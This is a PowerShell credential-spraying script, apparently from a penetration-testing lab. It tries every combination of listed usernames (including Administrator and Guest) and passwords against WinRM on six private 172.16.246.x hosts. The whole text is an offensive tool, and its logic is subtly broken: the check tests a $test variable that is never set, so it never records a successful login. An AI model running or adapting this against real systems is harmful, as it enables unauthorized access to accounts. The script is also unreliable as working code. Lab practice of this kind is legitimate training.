

$usernames = 'Administrator,Guest,joe'.split(',') #,krbtgt,leon,mario,offsec,peach,wario,yoshi,daisy,toad,goomba,offsec'.split(',')
$passwords = 'Flowers1,Mushroom!,lab,password'.split(',')
$ips = '172.16.246.10,172.16.246.11,172.16.246.12,172.16.246.13,172.16.246.82,172.16.246.83'.split(',')

$matches = @()

foreach ($username in $usernames)
{
    foreach ($password in $passwords)
    {
        $securepass = $password | ConvertTo-SecureString -AsPlainText -Force 
        $credential = [PSCredential]::New($username,$securepass)
        foreach($ip in $ips)
        {
            Write-Host "testing $ip : $username : $password"
            try
            {
                Test-WSMan -ComputerName $ip -Authentication Default -Credential $credential

                if ($test)
                {
                
                $match = "$ip : $username : $password"
                $matches += $match
                Write-Host $match
                }
            
            }
            catch
            {
                Write-host "Failed."
            }
        }
    }
}

$numMatches = $matches.Length

Write-Host "done. Found $numMatches matches:"
Write-Host $matches
